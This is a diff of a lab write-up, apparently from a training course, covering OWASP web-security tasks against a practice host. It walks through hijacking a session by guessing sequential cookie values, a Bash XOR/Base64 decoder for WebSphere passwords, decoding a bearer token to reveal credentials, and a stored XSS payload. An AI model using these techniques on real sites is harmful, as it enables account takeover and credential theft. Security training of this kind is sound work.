@@ -1,6 +1,73 @@
+# Task 0. (A1:2021) - Broken Access Control
+
+Go to http://web0x01.hbtn/a1/hijack_session
+
+Inspect the web page. Go to Storage -> Cookies 
+There is a cookie named "hijack_session" and its "value"
+
+On Ubuntu 22.04 run the following command to get other cookies.
+for i in {1..10}; do curl -s -I http://web0x01.hbtn/a1/hijack_session/ | awk '/hijack_session/ {print $2}'; done
+
+Find missing cookies.
+hijack_session=33ec378b-d561-4dd7-b3c-3367836-17687406444;
+hijack_session=33ec378b-d561-4dd7-b3c-3367837-17687406446;
+hijack_session=33ec378b-d561-4dd7-b3c-3367839-17687406448;
+hijack_session=33ec378b-d561-4dd7-b3c-3367840-17687406450;
+hijack_session=33ec378b-d561-4dd7-b3c-3367841-17687406451;
+hijack_session=33ec378b-d561-4dd7-b3c-3367842-17687406452;
+hijack_session=33ec378b-d561-4dd7-b3c-3367843-17687406454;
+hijack_session=33ec378b-d561-4dd7-b3c-3367844-17687406455;
+hijack_session=33ec378b-d561-4dd7-b3c-3367845-17687406457;
+hijack_session=33ec378b-d561-4dd7-b3c-3367846-17687406458;
+
+The cookie will be
+33ec378b-d561-4dd7-b3c-3367838-17687406447
+
+Change this cookie on a "Value" and refresh the page.
 
 
-# Get password from a Base64 hash
+# Task 1. (A2:2021) - Cryptographic Failures - Scripting
+Create a Bash script that decode XOR WebSphere.
+ - Accept the Hash args: $1.
+
+Here is a script for decoding the Base64 hash:
+
+if [ $# -ne 1 ]; then
+    echo "Usage: $0 {xor}base64_string"
+    exit 1
+fi
+
+encoded=${1#"{xor}"}
+
+echo "$encoded" | base64 -d | perl -pe 's/(.)/chr(ord($1) ^ 0x5F)/ge'
+
+
+
+Run the script to test if working.
+
+./1-xor_decoder.sh {xor}KzosKw==
+If we got the word "test" then the script is working.
+
+
+# Task 2. (A2:2021) - Cryptographic Failures - Catch The Flag
+# Get the password from a Base64 hash using 1-xor_decoder.sh script
+
+Go to http://web0x01.hbtn/a2/crypto_encoding_failure/
+Inspect the web page. Go to Network click to profile. On Request Headers find Authorization value.
+
+This is a bearer token. A Bearer token is an access token used to authenticate HTTP requests.
+
+eyd1c2VybmFtZSc6ICd5b3NyaScsICdwYXNzd29yZF9oYXNoJzogJ0R6NThiV2ttRmhNcU9SVU9EaVZ2SlJBV0xoVVRHUlJvS0E9PSd9
+
+
+Run this on a Linux.
+echo eyd1c2VybmFtZSc6ICd5b3NyaScsICdwYXNzd29yZF9oYXNoJzogJ0R6NThiV2ttRmhNcU9SVU9EaVZ2SlJBV0xoVVRHUlJvS0E9PSd9 | base64 -d
+
+We get this output.
+{'username': 'yosri', 'password_hash': 'Dz58bWkmFhMqORUODiVvJRAWLhUTGRRoKA=='}
+
+Run the script using "password_hash" value.
+
 ./1-xor_decoder.sh Dz58bWkmFhMqORUODiVvJRAWLhUTGRRoKA==
 
 
@@ -12,12 +79,12 @@ Pa#26yILufJQQz0zOIqJLFK7w
 
 
 
-0	"John - Visited you - Sun Jan 18 12:00:57 2026 - UserID: 918203"
-1	"Jimmy - Visited you - Sun Jan 18 12:00:57 2026 - UserID: 32781850"
-2	"Dexter - Visited you - Sun Jan 18 12:00:57 2026 - UserID: 811152675"
-3	"You - Visited Dexter - Sun Jan 18 12:01:56 2026 - UserID: 58263966"
-4	"You - Visited John - Sun Jan 18 12:02:09 2026 - UserID: 58263966"
-5	"You - Visited Jimmy - Sun Jan 18 12:02:14 2026 - UserID: 58263966"
+0 "John - Visited you - Sun Jan 18 12:00:57 2026 - UserID: 918203"
+1 "Jimmy - Visited you - Sun Jan 18 12:00:57 2026 - UserID: 32781850"
+2 "Dexter - Visited you - Sun Jan 18 12:00:57 2026 - UserID: 811152675"
+3 "You - Visited Dexter - Sun Jan 18 12:01:56 2026 - UserID: 58263966"
+4 "You - Visited John - Sun Jan 18 12:02:09 2026 - UserID: 58263966"
+5 "You - Visited Jimmy - Sun Jan 18 12:02:14 2026 - UserID: 58263966"
 
 You - Followed Dexter - Sun Jan 18 12:03:50 2026 - UserID: 58263966
 You - Followed John - Sun Jan 18 12:03:52 2026 - UserID: 58263966
@@ -27,6 +94,19 @@ FLAG_1/2:
 0bafba7593f6f8ed8ff976404a095f15
 
 
+# Task 4
+Navigate to http://web0x01.hbtn/a3/xss_stored/edit
 
-Add <script>alert('XSS')</script> and then Update the profile.
+
+Add the following script to First name, Last name, Role and Bio and then Update the profile.
+
+<script>alert('XSS')</script>
+
+Go to http://web0x01.hbtn/a3/xss_stored/profile
+
+Right click on the web page click to "View Page Source".
+
+Serach bio="<script>alert('XSS')</script>" 
+
+Add "bio" word to the 4-vuln.txt file.
 
